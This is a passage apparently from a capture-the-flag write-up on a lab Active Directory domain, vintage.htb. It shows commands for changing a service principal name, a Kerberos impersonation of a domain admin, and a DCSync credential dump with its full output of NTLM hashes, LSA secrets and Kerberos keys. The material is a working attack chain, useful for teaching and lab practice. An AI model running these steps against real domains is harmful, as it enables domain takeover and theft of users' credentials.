└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k set object svc_sql servicePrincipalName -v "cifs/lalala"
[+] svc_sql's servicePrincipalName has been updated
```

#### 3 - get svc_sql ccache with new privs and impersonate l.bianchi_adm (l.bianchi_adm is member of domain admins)

```
└─$ impacket-getST -impersonate l.bianchi_adm -spn 'cifs/dc01.vintage.htb' -k -dc-ip dc01.vintage.htb 'vintage.htb/svc_sql:Zer0the0ne'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating l.bianchi_adm

...

[*] Requesting S4U2Proxy
[*] Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

## DCSync

```
└─$ export KRB5CCNAME=l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache 

└─$ impacket-secretsdump -k dc01.vintage.htb                                
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb632ebd8c7df30094b6cea89cdf372be
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e41bb21e027286b2e6fd41de81bce8db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VINTAGE\DC01$:plain_password_hex:ca385c025f7b81712d83d60e6c6ac2c6787e877114fe8342bd9b496572c6e1f3d2c82dee411d9bbdb6dc1eb7981bea8a7faa98d2b6efab8b3a90f85d48a3ec66c5f2b4c6d2d4ca747927ab1efd025f66a8e6914917e5d1e6112c7f2a668129ae0303f41f6b0b6c01219c09522da4f5cf9050bed3954973f14a4ff49a12f64d570d6cbd466b81c2ec86c0758213f35cf6db976b25aac295fe3e3953ca30cbe3afc9677d932d95cca63da09ad700abc22a9836ddb44de0be762f12f46eba649b293794f50a946898d1a786dfcac9582bd20e8fd21a9678d1e2d82b7bf3dec2f03bf67ab63d73ec4b34968678a77c3f6106
VINTAGE\DC01$:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x329e3f315c1e7294f086908d3d14c990c030305a
dpapi_userkey:0x2bd12147462ab2b6e92adcb202c9d8258c270790
[*] NL$KM 
 0000   7E F4 65 54 4C 71 04 1D  24 FC 9B ED 7B 0D B1 1B   ~.eTLq..$...{...
 0010   F0 E6 0E BF EF 13 78 C1  04 48 9F AE 46 49 39 A5   ......x..H..FI9.
 0020   D6 A9 94 E1 CC 13 FB 7D  29 02 00 C1 F8 CD 61 F3   .......}).....a.
 0030   8C 6D 56 42 1E 8B 3A 92  E1 8E E0 3C 6E 77 04 BC   .mVB..:....<nw..
NL$KM:7ef465544c71041d24fc9bed7b0db11bf0e60ebfef1378c104489fae464939a5d6a994e1cc13fb7d290200c1f8cd61f38c6d56421e8b3a92e18ee03c6e7704bc
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:587368d45a7559a1678b842c5c829fb3:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:a46cac126e723b4ae68d66001ab9135ef30aa4b7c0eb1ca1663495e15fe05e75
gMSA01$:aes128-cts-hmac-sha1-96:6d8f13cee54c56bf541cfc162e8a22ef
gMSA01$:des-cbc-md5:a70d6b43e64a2580
FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
FS01$:des-cbc-md5:dafb3738389e205b
```

